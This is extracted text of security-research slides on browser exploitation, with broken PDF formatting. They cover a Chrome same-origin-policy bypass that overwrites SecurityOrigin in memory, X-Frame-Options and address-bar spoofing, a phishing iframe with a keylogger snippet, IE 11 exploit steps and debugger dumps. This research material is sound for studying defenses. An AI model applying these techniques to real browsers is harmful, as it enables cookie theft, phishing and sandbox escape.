  bool	
  canAccess	
  =	
  false; 
  if	
  (m_protocol	
  ==	
  other-­‐>m_protocol)	
  { 
  if	
  (!m_domainWasSetInDOM	
  &&	
  !other-­‐>m_domainWasSetInDOM)	
  { 
  if	
  (m_host	
  ==	
  other-­‐>m_host	
  &&	
  m_port	
  ==	
  other-­‐>m_port) 
         canAccess	
  =	
  true; 
  }	
  else	
  if	
  (m_domainWasSetInDOM	
  &&	
  other-­‐>m_domainWasSetInDOM)	
  { 
  if	
  (m_domain	
  ==	
  other-­‐>m_domain) 
          canAccess	
  =	
  true; 
  } 
  } 
… 
  return	
  canAccess; 
} 
UXSS 
UXSS 
UXSS 
•  Overwrite	
– m_protocol	
– m_host	
– m_port	
– m_domain	
– SecurityOrigin	
UXSS 
  //	
  Get	
  current	
  security	
  origin	
  var	
  v8DocAddr	
  =	
  leakAddr(document);	
  console.log('[+]	
  Javscript	
  document	
  address:	
  '	
  +	
  v8DocAddr.toString(16));	
  …	
  var	
  secOriAddr	
  =	
  readDWord(secOriPtrAddr);	
  console.log('[+]	
  Security	
  origin	
  address:	
  '	
  +	
  secOriAddr.toString(16));	
  var	
  hostPtrAddr	
  =	
  secOriAddr	
  +	
  0x08;	
  console.log('[+]	
  Host	
  pointer	
  address:	
  '	
  +	
  hostPtrAddr.toString(16));	
  var	
  domainPtrAddr	
  =	
  secOriAddr	
  +	
  0x0c;	
  console.log('[+]	
  Doamin	
  pointer	
  address:	
  '	
  +	
  domainPtrAddr.toString(16));	
  …	
  //	
  Overwrite	
  current	
  security	
  origin	
  with	
  that	
  of	
  iframe	
  page	
  to	
  bypass	
  the	
  SOP	
  writeDWord(secOriPtrAddr,	
  ifrSecOriAddr);	
Demo 
X-­‐Frame-­‐OpTons 
•  X-­‐Frame-­‐OpTons	
  DENY	
– Github	
– Twi>er	
– Facebook	
– Gmail 
Window 
•  New	
  window	
  -­‐>	
  No	
  limited	
•  Pop-­‐ups	
  -­‐>	
  Forbid	
•  Social	
  engineering 
Window 
  //	
  Get	
  window's	
  security	
  origin	
  var	
  jsWinAddr	
  =	
  leakAddr(wins[idx]);	
  console.log('[+]	
  Javascript	
  window	
  address:	
  '	
  +	
  jsWinAddr.toString(16));	
  …	
  var	
  winSecOriAddr	
  =	
  readDWord(winSecOriPtrAddr);	
  console.log('[+]	
  Window	
  security	
  origin	
  address:	
  '	
  +	
  winSecOriAddr.toString(16));	
  var	
  winHostAddr	
  =	
  readDWord(winSecOriAddr	
  +	
  0x08);	
  console.log('[+]	
  Window	
  host	
  address:	
  '	
  +	
  winHostAddr.toString(16));	
  var	
  winDomainAddr	
  =	
  readDWord(winSecOriAddr	
  +	
  0x0c);	
  console.log('[+]	
  Window	
  domain	
  address:	
  '	
  +	
  winDomainAddr.toString(16)); 
Demo 
X-­‐Frame-­‐OpTons 
•  Set	
  to	
  the	
  same	
  origin	
•  Get	
  cookie	
X-­‐Frame-­‐OpTons 
•  STll	
  doesn’t	
  work 
  funcLon	
  appendIframes(urls)	
  {	
  iframes	
  =	
  [];	
  for	
  (var	
  i	
  =	
  0;	
  i	
  canAccessCookies())	
  { 
  … 
} 
bool	
  canAccessCookies()	
  const	
  {	
  return	
  !isUnique();	
  } 
X-­‐Frame-­‐OpTons 
•  Overwrite	
  m_isUnique 
X-­‐Frame-­‐OpTons 
X-­‐Frame-­‐OpTons 
•  Browser	
  process	
  -­‐>	
  Network	
•  Sandbox	
  privilege	
– L	
  h>p	
  response	
  receiving	
– L	
  h>p	
  header	
•  Browser	
  -­‐>	
  Top	
  frame	
  ? 
X-­‐Frame-­‐OpTons 
Address	
  Bar	
  Spooﬁng 
•  Top	
  frame	
  J	
•  Change	
  src	
  of	
  iframe	
  =>	
  Top-­‐level	
  navigaTon	
  =>	
  Change	
  address	
  bar 
Renderer	
  process 
params.transiLon	
  =	
  staLc_cast( 
  params.transiLon	
  |	
  PAGE_TRANSITION_CLIENT_REDIRECT);	
…	
Send(new	
  FrameHostMsg_DidCommitProvisionalLoad	
  (rouLng_id_,	
  params));	
… 
Phishing 
•  Full	
  screen	
  the	
  iframe	
  ==	
  Total	
  phishing 
  iframes[i].frameBorder	
  =	
  0;	
  iframes[i].width	
  =	
  "100%";	
  iframes[i].height	
  =	
  "100%";	
funcLon	
  keylogger()	
  {	
  iframeDoc.onkeypress	
  =	
  funcLon(e)	
  {	
  var	
  get	
  =	
  window.event	
  ?	
  event	
  :	
  e;	
  var	
  key	
  =	
  get.keyCode	
  ?	
  get.keyCode	
  :	
  get.charCode;	
  }	
  setTimeout('alert("password:	
  "	
  +	
  keys)',	
  10000);	
Demo 
Sandbox	
  and	
  SOP’s	
  Dilemma 
•  Web	
  security	
  mechanisms	
  -­‐>	
  Sandboxed	
  process	
–  SOP	
–  X-­‐Frame-­‐OpTon	
–  Sandbox	
–  CSP	
•  Other	
  browsers? 
•  Browser	
  process	
  trust	
  IPC	
  message 
•  Sandbox	
  -­‐>	
  So~ware	
  security	
•  SOP	
  -­‐>	
  Request	
  &	
  display	
•  J	
  Memory	
  corrupTon	
  =>	
  Enhance	
  our	
  BeEF 
Site	
  IsolaTon 
•  Google	
  Chrome	
  security	
  team	
– Refactoring	
  project 
•  Let’s	
  look	
  forward	
  to	
  their	
  work! 
DEP’s	
  Dilemma 
•  Von	
  Neumann	
  Architecture	
  -­‐>	
  InjecTon	
–  Command	
–  Code	
–  SQL	
–  XSS	
•  Control	
  &	
  Privilege	
  -­‐>	
  Code 
•  Self-­‐reference 
•  With	
  great	
  power	
  comes	
  great	
  defects	
–  Biological	
  virus	
–  Computer	
  vulnerability 
Cross-­‐disciplinary	
  Analogy	
  (CDA) 
•  MathemaTcal	
  Logic	
  Paradox 
– Gödel's	
  incompleteness	
  theorems 
– Liar	
  paradox	
•  “This	
  sentence	
  is	
  false.”	
– 	
  Russell’s	
  paradox 
Cross-­‐disciplinary	
  Analogy 
•  GeneTc	
  biology	
– T4	
  phage	
•  AcousTc	
  resonance 
Garbage	
  Collect 
•  jscript9	
  -­‐>	
  conservaTve	
  GC	
– Aligned	
  Dwords	
  -­‐>	
  Pointers	
– Data	
  treated	
  as	
  pointers	
  -­‐>	
  Memory	
  leak 
– Info	
  leak	
  in	
  IE 
IE	
  11	
  Exploit 
Execute 
•  Write	
  PE	
  to	
  Temp/Low 
– Copy	
  from	
  same	
  domain	
•  C:\Windows\System32\cmd.exe	
•  C:\Windows\System32\calc.exe 
•  Execute	
  in	
  Temp/Low 
– Fake	
  security	
  manager	
  (explib2	
  by	
  guhe120)	
Out-­‐of-­‐date	
  AcTveX	
  Control	
  Blocking 
•  IE	
  block	
  out-­‐of-­‐date	
  AcTveX	
  controls	
– August	
  2014	
– Java	
  a>ack 
Summary 
•  ASLR,	
  DEP,	
  Sandbox	
  and	
  SOP	
  -­‐>	
  Dilemmas	
•  Availability	
  &	
  Performance	
•  ROI	
  miTgaTon	
•  Combat	
  will	
  go	
  on 
Vulnerability	
  Exploitable	
  Analysis 
Vulnerability	
  Exploitable	
  Analysis 
element.XXle	
  =	
  “0xdeadc0de42424242…”;	
0:007>	
  g 
Breakpoint	
  2	
  hit 
eax=00000000	
  ebx=0905ﬀ00	
  ecx=00000091	
  edx=00000090	
  esi=00000000	
edi=00000000 
eip=68719629	
  esp=034ba7c8	
  ebp=034ba818	
  iopl=0	
  nv	
  up	
  ei	
  pl	
  zr	
  na	
  pe	
  nc 
cs=001b	
  ss=0023	
  ds=0023	
  es=0023	
  fs=003b	
  gs=0000	
  eﬂ=00000246 
MSHTML!`CBackgroundInfo::Property'::`7'::`dynamic	
  atexit	
destructor	
  for	
  'ﬁeldDefaultValue''+0x188124: 
68719629	
  8b03	
  mov	
  eax,dword	
  ptr	
  [ebx]	
  ds:0023:0905ﬀ00=dec0adde	
0:007>	
  dd	
  ebx 
0905ﬀ00	
  deadc0de	
  42424242	
  42424242	
  42424242 
0905ﬀ10	
  42424242	
  42424242	
  42424242	
  42424242 
0905ﬀ20	
  42424242	
  42424242	
  42424242	
  42424242 
0905ﬀ30	
  42424242	
  42424242	
  42424242	
  42424242 
0905ﬀ40	
  42424242	
  42424242	
  42424242	
  42424242 
0905ﬀ50	
  42424242	
  42424242	
  42424242	
  00004242 
0905ﬀ60	
  66e08627	
  88006569	
  deadc0de	
  42424242 
0905ﬀ70	
  42424242	
  42424242	
  42424242	
  42424242 
Second	
  Exploit	
  Path 
•  CElement::GetOﬀsetParentHelper 
– CTreeNode::GetFancyFormatIndexHelper 
•  CMarkup::GetGeneratedElement	
  //	
  Write	
  memory 
•  Tree::FirstLe>erBuilder::ComputeFirstLe>erFormats 
–  Layout::ContentReader::GetTopWindow 
»  Tree::ElementNode::FirstChild	
  //	
  Inﬁnite	
  loop 
Second	
  Exploit	
  Path 
•  Modify	
  VarArray	
  Capacity	
– Separate	
  large	
  JavascriptNaJveIntArray	
  or	
JavascriptArray	
  Spray 
Second	
  Exploit	
  Path 
0:007>	
  dd	
  0d1e0000 
0d1e0000	
  00000000	
  00000ﬀ0	
  00000000	
  00000000	
0d1e0010	
  00000000	
  000003f8	
  000003f8	
  00000000 
A^er	
  p:	
  00000000	
  000003f8	
  043803f8	
  000008a5	
0d1e0020	